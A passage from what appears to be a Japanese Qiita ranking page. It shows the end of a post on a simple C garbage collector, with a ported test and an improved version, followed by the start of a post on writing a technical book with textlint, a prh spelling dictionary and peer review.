    <span class="n">list_for_each_entry_safe</span> <span class="p">(</span><span class="n">head</span><span class="p">,</span> <span class="n">n</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">gc</span><span class="p">.</span><span class="n">spaces</span><span class="p">[</span><span class="n">gc</span><span class="p">.</span><span class="n">from</span><span class="p">],</span> <span class="n">head</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">list_del</span><span class="p">(</span><span class="o">&amp;</span><span class="n">head</span><span class="o">-&gt;</span><span class="n">head</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">head</span><span class="o">-&gt;</span><span class="n">type</span><span class="o">-&gt;</span><span class="n">free</span><span class="p">)</span>
            <span class="n">head</span><span class="o">-&gt;</span><span class="n">type</span><span class="o">-&gt;</span><span class="n">free</span><span class="p">(</span><span class="n">head</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">gc</span><span class="p">.</span><span class="n">from</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">-</span> <span class="n">gc</span><span class="p">.</span><span class="n">from</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">gc_destroy</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">gc</span><span class="p">.</span><span class="n">stack</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">gc_run</span><span class="p">();</span>
<span class="p">}</span>
</pre></div></div>

<p>以下はpicogcのテスト[3]を移植したもの。</p>

<div class="code-frame" data-lang="c"><div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">"gc.h"</span><span class="cp"></span>

<span class="k">struct</span> <span class="n">gc_state</span> <span class="n">gc</span><span class="p">;</span>

<span class="k">struct</span> <span class="n">list</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">value</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">list</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">gc_head</span> <span class="n">head</span><span class="p">;</span>
<span class="p">};</span>

<span class="kt">void</span> <span class="nf">list_mark</span><span class="p">(</span><span class="k">struct</span> <span class="n">gc_head</span> <span class="o">*</span><span class="n">head</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">struct</span> <span class="n">list</span> <span class="o">*</span><span class="n">list</span> <span class="o">=</span> <span class="n">gc_entry</span><span class="p">(</span><span class="n">head</span><span class="p">,</span> <span class="k">struct</span> <span class="n">list</span><span class="p">,</span> <span class="n">head</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">list</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">gc_mark</span><span class="p">(</span><span class="o">&amp;</span><span class="n">list</span><span class="o">-&gt;</span><span class="n">next</span><span class="o">-&gt;</span><span class="n">head</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">list_free</span><span class="p">(</span><span class="k">struct</span> <span class="n">gc_head</span> <span class="o">*</span><span class="n">head</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">struct</span> <span class="n">list</span> <span class="o">*</span><span class="n">list</span> <span class="o">=</span> <span class="n">gc_entry</span><span class="p">(</span><span class="n">head</span><span class="p">,</span> <span class="k">struct</span> <span class="n">list</span><span class="p">,</span> <span class="n">head</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"free %d!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">list</span><span class="o">-&gt;</span><span class="n">value</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">list</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">const</span> <span class="k">struct</span> <span class="n">gc_object_type</span> <span class="n">list_type</span> <span class="o">=</span> <span class="p">{</span> <span class="n">list_mark</span><span class="p">,</span> <span class="n">list_free</span> <span class="p">};</span>

<span class="k">struct</span> <span class="n">list</span> <span class="o">*</span><span class="nf">cons</span><span class="p">(</span><span class="kt">int</span> <span class="n">value</span><span class="p">,</span> <span class="k">struct</span> <span class="n">list</span> <span class="o">*</span><span class="n">next</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">struct</span> <span class="n">list</span> <span class="o">*</span><span class="n">list</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">list</span><span class="p">));</span>
    <span class="n">INIT_GC_HEAD</span><span class="p">(</span><span class="o">&amp;</span><span class="n">list</span><span class="o">-&gt;</span><span class="n">head</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">list_type</span><span class="p">);</span>
    <span class="n">list</span><span class="o">-&gt;</span><span class="n">value</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>
    <span class="n">list</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">next</span><span class="p">;</span>
    <span class="k">return</span> <span class="n">list</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">struct</span> <span class="n">list</span> <span class="o">*</span><span class="nf">doit</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">gc_scope_t</span> <span class="n">s</span> <span class="o">=</span> <span class="n">gc_scope_open</span><span class="p">();</span>

    <span class="k">struct</span> <span class="n">list</span> <span class="o">*</span><span class="n">a</span> <span class="o">=</span> <span class="n">cons</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="k">struct</span> <span class="n">list</span> <span class="o">*</span><span class="n">b</span> <span class="o">=</span> <span class="n">cons</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="k">struct</span> <span class="n">list</span> <span class="o">*</span><span class="n">c</span> <span class="o">=</span> <span class="n">cons</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="k">struct</span> <span class="n">list</span> <span class="o">*</span><span class="n">d</span> <span class="o">=</span> <span class="n">cons</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>

    <span class="n">gc_run</span><span class="p">();</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"0 objects must be released"</span><span class="p">);</span>

    <span class="n">gc_scope_close</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
    <span class="n">gc_protect</span><span class="p">(</span><span class="o">&amp;</span><span class="n">d</span><span class="o">-&gt;</span><span class="n">head</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">d</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">gc_init</span><span class="p">();</span>

    <span class="p">{</span>
        <span class="n">gc_scope_t</span> <span class="n">s</span> <span class="o">=</span> <span class="n">gc_scope_open</span><span class="p">();</span>

        <span class="k">struct</span> <span class="n">list</span> <span class="o">*</span><span class="n">list</span> <span class="o">=</span> <span class="n">doit</span><span class="p">();</span>

        <span class="n">gc_run</span><span class="p">();</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"2 objects must be released"</span><span class="p">);</span>

        <span class="n">list</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

        <span class="n">gc_run</span><span class="p">();</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"1 object must be released"</span><span class="p">);</span>

        <span class="n">gc_scope_close</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">gc_run</span><span class="p">();</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"1 object must be released"</span><span class="p">);</span>

    <span class="n">gc_destroy</span><span class="p">();</span>
<span class="p">}</span>
</pre></div></div>

<h1>
<span id="おまけその2" class="fragment"></span><a href="#%E3%81%8A%E3%81%BE%E3%81%91%E3%81%9D%E3%81%AE2"><i class="fa fa-link"></i></a>おまけ(その2)</h1>

<p>改良版</p>

<div class="code-frame" data-lang="c"><div class="highlight"><pre><span></span>
<span class="k">struct</span> <span class="n">gc_scope</span> <span class="p">{</span>
    <span class="k">struct</span> <span class="n">list_head</span> <span class="n">local</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">gc_scope</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
<span class="p">};</span>

<span class="k">extern</span> <span class="k">struct</span> <span class="n">gc_state</span> <span class="p">{</span>
    <span class="k">struct</span> <span class="n">list_head</span> <span class="n">from</span><span class="p">,</span> <span class="n">to</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">gc_scope</span> <span class="o">*</span><span class="n">scope</span><span class="p">,</span> <span class="n">global</span><span class="p">;</span>
<span class="p">}</span> <span class="n">gc</span><span class="p">;</span>

<span class="k">struct</span> <span class="n">gc_head</span> <span class="p">{</span>
    <span class="k">struct</span> <span class="n">list_head</span> <span class="n">head</span><span class="p">;</span>
    <span class="k">const</span> <span class="k">struct</span> <span class="n">gc_object_type</span> <span class="o">*</span><span class="n">type</span><span class="p">;</span>
<span class="p">};</span>

<span class="k">struct</span> <span class="n">gc_object_type</span> <span class="p">{</span>
    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">mark</span><span class="p">)(</span><span class="k">struct</span> <span class="n">gc_head</span> <span class="o">*</span><span class="p">);</span>
    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">free</span><span class="p">)(</span><span class="k">struct</span> <span class="n">gc_head</span> <span class="o">*</span><span class="p">);</span>
<span class="p">};</span>

<span class="cp">#define gc_entry(ptr, type, field) container_of(ptr, type, field)</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">gc_scope_open</span><span class="p">(</span><span class="k">struct</span> <span class="n">gc_scope</span> <span class="o">*</span><span class="n">s</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">INIT_LIST_HEAD</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="o">-&gt;</span><span class="n">local</span><span class="p">);</span>
    <span class="n">s</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">gc</span><span class="p">.</span><span class="n">scope</span><span class="p">;</span>
    <span class="n">gc</span><span class="p">.</span><span class="n">scope</span> <span class="o">=</span> <span class="n">s</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">gc_scope_close</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">list_splice</span><span class="p">(</span><span class="o">&amp;</span><span class="n">gc</span><span class="p">.</span><span class="n">scope</span><span class="o">-&gt;</span><span class="n">local</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">gc</span><span class="p">.</span><span class="n">from</span><span class="p">);</span>
    <span class="n">gc</span><span class="p">.</span><span class="n">scope</span> <span class="o">=</span> <span class="n">gc</span><span class="p">.</span><span class="n">scope</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">gc_preserve</span><span class="p">(</span><span class="k">struct</span> <span class="n">gc_head</span> <span class="o">*</span><span class="n">head</span><span class="p">,</span> <span class="k">struct</span> <span class="n">gc_scope</span> <span class="o">*</span><span class="n">s</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">list_move</span><span class="p">(</span><span class="o">&amp;</span><span class="n">head</span><span class="o">-&gt;</span><span class="n">head</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">s</span><span class="o">-&gt;</span><span class="n">local</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">gc_release</span><span class="p">(</span><span class="k">struct</span> <span class="n">gc_head</span> <span class="o">*</span><span class="n">head</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">list_move</span><span class="p">(</span><span class="o">&amp;</span><span class="n">head</span><span class="o">-&gt;</span><span class="n">head</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">gc</span><span class="p">.</span><span class="n">from</span><span class="p">);</span>
<span class="p">}</span>

<span class="cp">#define gc_protect(head) gc_preserve((head), gc.scope-&gt;next)</span>
<span class="cp">#define gc_pin(head) gc_preserve((head), &amp;gc.global)</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">INIT_GC_HEAD</span><span class="p">(</span><span class="k">struct</span> <span class="n">gc_head</span> <span class="o">*</span><span class="n">head</span><span class="p">,</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">gc_object_type</span> <span class="o">*</span><span class="n">type</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">INIT_LIST_HEAD</span><span class="p">(</span><span class="o">&amp;</span><span class="n">head</span><span class="o">-&gt;</span><span class="n">head</span><span class="p">);</span>
    <span class="n">head</span><span class="o">-&gt;</span><span class="n">type</span> <span class="o">=</span> <span class="n">type</span><span class="p">;</span>
    <span class="n">gc_preserve</span><span class="p">(</span><span class="n">head</span><span class="p">,</span> <span class="n">gc</span><span class="p">.</span><span class="n">scope</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">gc_mark</span><span class="p">(</span><span class="k">struct</span> <span class="n">gc_head</span> <span class="o">*</span><span class="n">head</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">head</span><span class="o">-&gt;</span><span class="n">type</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="n">head</span><span class="o">-&gt;</span><span class="n">type</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">gc_object_type</span> <span class="o">*</span><span class="p">)</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">head</span><span class="o">-&gt;</span><span class="n">type</span> <span class="o">|</span> <span class="mi">1</span><span class="p">);</span>
    <span class="n">list_move_tail</span><span class="p">(</span><span class="o">&amp;</span><span class="n">head</span><span class="o">-&gt;</span><span class="n">head</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">gc</span><span class="p">.</span><span class="n">to</span><span class="p">);</span>
<span class="p">}</span>

<span class="cp">#define gc_type(head) ((struct gc_object_type *) ((unsigned long) (head)-&gt;type &amp; ~1ul))</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">gc_run</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">struct</span> <span class="n">gc_head</span> <span class="o">*</span><span class="n">head</span><span class="p">,</span> <span class="o">*</span><span class="n">n</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">gc_scope</span> <span class="o">*</span><span class="n">s</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">s</span> <span class="o">=</span> <span class="n">gc</span><span class="p">.</span><span class="n">scope</span><span class="p">;</span> <span class="n">s</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="n">s</span> <span class="o">=</span> <span class="n">s</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">list_for_each_entry</span> <span class="p">(</span><span class="n">head</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">s</span><span class="o">-&gt;</span><span class="n">local</span><span class="p">,</span> <span class="n">head</span><span class="p">)</span>
            <span class="n">head</span><span class="o">-&gt;</span><span class="n">type</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">gc_object_type</span> <span class="o">*</span><span class="p">)</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">head</span><span class="o">-&gt;</span><span class="n">type</span> <span class="o">|</span> <span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="cm">/* copy live objects */</span>
    <span class="n">INIT_LIST_HEAD</span><span class="p">(</span><span class="o">&amp;</span><span class="n">gc</span><span class="p">.</span><span class="n">to</span><span class="p">);</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">s</span> <span class="o">=</span> <span class="n">gc</span><span class="p">.</span><span class="n">scope</span><span class="p">;</span> <span class="n">s</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="n">s</span> <span class="o">=</span> <span class="n">s</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">list_for_each_entry</span> <span class="p">(</span><span class="n">head</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">s</span><span class="o">-&gt;</span><span class="n">local</span><span class="p">,</span> <span class="n">head</span><span class="p">)</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">gc_type</span><span class="p">(</span><span class="n">head</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">mark</span><span class="p">)</span> <span class="n">gc_type</span><span class="p">(</span><span class="n">head</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">mark</span><span class="p">(</span><span class="n">head</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">list_for_each_entry</span> <span class="p">(</span><span class="n">head</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">gc</span><span class="p">.</span><span class="n">to</span><span class="p">,</span> <span class="n">head</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">gc_type</span><span class="p">(</span><span class="n">head</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">mark</span><span class="p">)</span> <span class="n">gc_type</span><span class="p">(</span><span class="n">head</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">mark</span><span class="p">(</span><span class="n">head</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="cm">/* clean up */</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">s</span> <span class="o">=</span> <span class="n">gc</span><span class="p">.</span><span class="n">scope</span><span class="p">;</span> <span class="n">s</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="n">s</span> <span class="o">=</span> <span class="n">s</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">list_for_each_entry</span> <span class="p">(</span><span class="n">head</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">s</span><span class="o">-&gt;</span><span class="n">local</span><span class="p">,</span> <span class="n">head</span><span class="p">)</span>
            <span class="n">head</span><span class="o">-&gt;</span><span class="n">type</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">gc_object_type</span> <span class="o">*</span><span class="p">)</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">head</span><span class="o">-&gt;</span><span class="n">type</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mi">1ul</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">list_for_each_entry</span> <span class="p">(</span><span class="n">head</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">gc</span><span class="p">.</span><span class="n">to</span><span class="p">,</span> <span class="n">head</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">head</span><span class="o">-&gt;</span><span class="n">type</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">gc_object_type</span> <span class="o">*</span><span class="p">)</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">head</span><span class="o">-&gt;</span><span class="n">type</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mi">1ul</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">list_for_each_entry_safe</span> <span class="p">(</span><span class="n">head</span><span class="p">,</span> <span class="n">n</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">gc</span><span class="p">.</span><span class="n">from</span><span class="p">,</span> <span class="n">head</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">head</span><span class="o">-&gt;</span><span class="n">type</span><span class="o">-&gt;</span><span class="n">free</span><span class="p">)</span> <span class="n">head</span><span class="o">-&gt;</span><span class="n">type</span><span class="o">-&gt;</span><span class="n">free</span><span class="p">(</span><span class="n">head</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">INIT_LIST_HEAD</span><span class="p">(</span><span class="o">&amp;</span><span class="n">gc</span><span class="p">.</span><span class="n">from</span><span class="p">);</span>
    <span class="n">list_splice</span><span class="p">(</span><span class="o">&amp;</span><span class="n">gc</span><span class="p">.</span><span class="n">to</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">gc</span><span class="p">.</span><span class="n">from</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">gc_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">INIT_LIST_HEAD</span><span class="p">(</span><span class="o">&amp;</span><span class="n">gc</span><span class="p">.</span><span class="n">from</span><span class="p">);</span>
    <span class="n">gc</span><span class="p">.</span><span class="n">scope</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">gc_scope_open</span><span class="p">(</span><span class="o">&amp;</span><span class="n">gc</span><span class="p">.</span><span class="n">global</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">gc_destroy</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">gc</span><span class="p">.</span><span class="n">scope</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">gc_run</span><span class="p">();</span>
<span class="p">}</span>
</pre></div></div>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">75位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>130</kbd>
		<a target="_blank" href="https://qiita.com/janus_wel/items/68282df025ab9b0952e2">技術書を書いたハナシ</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-10-23<br />18:47:53</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/27516.html">janus_wel</a>(73件の記事)<br />(CureApp 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/27516/profile-images/1473685030">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[Book]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>React Native Japan で <a href="/besutome" class="user-mention js-hovercard" title="besutome" data-hovercard-target-type="user" data-hovercard-target-name="besutome">@besutome</a> 、 <a href="/YutamaKotaro" class="user-mention js-hovercard" title="YutamaKotaro" data-hovercard-target-type="user" data-hovercard-target-name="YutamaKotaro">@YutamaKotaro</a> と技術書典 3 で技術書を書いたのでその作業内容を記録しようと思う。<br>
出した本はこちら。 PDF 形式で配布している。</p>

<p><a href="https://rnjapan.booth.pm/items/665275" class="autolink" rel="nofollow noopener" target="_blank">https://rnjapan.booth.pm/items/665275</a></p>

<p>おおまかに次の流れで作業した。</p>

<ol>
<li>原稿を書く + 校正作業</li>
<li>レビュー</li>
<li>Re:VIEW 形式への変換</li>
<li>装丁 + 微調整</li>
</ol>

<p>次で各手順について書いていく。 textlint と Re:VIEW Template は素人が使っても確実に威力を発揮するので強く使用を推奨。</p>

<h2>
<span id="原稿を書く--校正作業" class="fragment"></span><a href="#%E5%8E%9F%E7%A8%BF%E3%82%92%E6%9B%B8%E3%81%8F--%E6%A0%A1%E6%AD%A3%E4%BD%9C%E6%A5%AD"><i class="fa fa-link"></i></a>原稿を書く + 校正作業</h2>

<p>原稿は markdown で書いて git で管理した。今回は複数人で書いたので github に repo を作ってそこで共有。</p>

<p>原稿を書く際は先に textlint と日本語用のルールをセットアップして、日本語として不自然にならないかチェックしながらやった。非常に有用なので使用をおすすめ。</p>

<ul>
<li>
<a href="http://efcl.info/2015/09/10/introduce-textlint/" class="autolink" rel="nofollow noopener" target="_blank">http://efcl.info/2015/09/10/introduce-textlint/</a>

<ul>
<li><a href="https://github.com/textlint/textlint" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/textlint/textlint</a></li>
<li><a href="https://github.com/textlint-ja/textlint-rule-preset-japanese" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/textlint-ja/textlint-rule-preset-japanese</a></li>
<li><a href="https://github.com/textlint-ja/textlint-rule-preset-JTF-style" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/textlint-ja/textlint-rule-preset-JTF-style</a></li>
</ul>
</li>
</ul>

<p>もひとつ、 textlint で一緒に表記ゆれもチェックできるのでやってみたがこちらも必須と言っていいものだと思う。</p>

<ul>
<li>
<a href="http://efcl.info/2015/09/14/textlint-rule-prh/" class="autolink" rel="nofollow noopener" target="_blank">http://efcl.info/2015/09/14/textlint-rule-prh/</a>

<ul>
<li><a href="https://github.com/textlint-rule/textlint-rule-prh" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/textlint-rule/textlint-rule-prh</a></li>
<li><a href="https://github.com/azu/textlint-rule-spellcheck-tech-word" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/azu/textlint-rule-spellcheck-tech-word</a></li>
</ul>
</li>
</ul>

<p>今回は書く内容にあわせて次のように辞書ファイルを追加して使ってみた。</p>

<div class="code-frame" data-lang="yaml"><div class="highlight"><pre><span></span><span class="nn">---</span>
<span class="l l-Scalar l-Scalar-Plain">version</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">1</span>
<span class="l l-Scalar l-Scalar-Plain">rules</span><span class="p p-Indicator">:</span>
  <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">expected</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">React Native</span>
    <span class="l l-Scalar l-Scalar-Plain">pattern</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">/[rR]eact ?[nN]ative/</span>
  <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">expected</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">DDD</span>
    <span class="l l-Scalar l-Scalar-Plain">pattern</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">/[dD]{3}/</span>
  <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">expected</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">Redux</span>
    <span class="l l-Scalar l-Scalar-Plain">pattern</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">/[rR]edux(?!-)/</span>
  <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">expected</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">Zeplin</span>
    <span class="l l-Scalar l-Scalar-Plain">pattern</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">/[zZ]eplin/</span>
  <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">expected</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">Web</span>
    <span class="l l-Scalar l-Scalar-Plain">pattern</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">/[wW]eb/</span>
  <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">expected</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">例えば</span>
    <span class="l l-Scalar l-Scalar-Plain">pattern</span><span class="p p-Indicator">:</span>  <span class="l l-Scalar l-Scalar-Plain">/たとえば/</span>
    <span class="l l-Scalar l-Scalar-Plain">specs</span><span class="p p-Indicator">:</span>
      <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">from</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">たとえば</span>
        <span class="l l-Scalar l-Scalar-Plain">to</span><span class="p p-Indicator">:</span>   <span class="l l-Scalar l-Scalar-Plain">例えば</span>
</pre></div></div>

<p>ポイントは <code>Redux</code> のところ。技術としての Redux は先頭大文字ではじめたいが、 <code>redux-saga</code> などのライブラリ名は小文字ではじめたいのでハイフンが後ろについている場合はマッチしないように先読み否定を使っている。</p>

<div class="code-frame" data-lang="yaml"><div class="highlight"><pre><span></span>  <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">expected</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">Redux</span>
    <span class="l l-Scalar l-Scalar-Plain">pattern</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">/[rR]edux(?!-)/</span>
</pre></div></div>

<h2>
<span id="レビュー" class="fragment"></span><a href="#%E3%83%AC%E3%83%93%E3%83%A5%E3%83%BC"><i class="fa fa-link"></i></a>レビュー</h2>

<p>3 人で書いたので交互にレビュー。わかりにくいところがスッキリしたり、内容がブラッシュアップされるのでひとりで書く場合でも誰かにレビュー依頼したほうがよいかも。</p>

<h2>
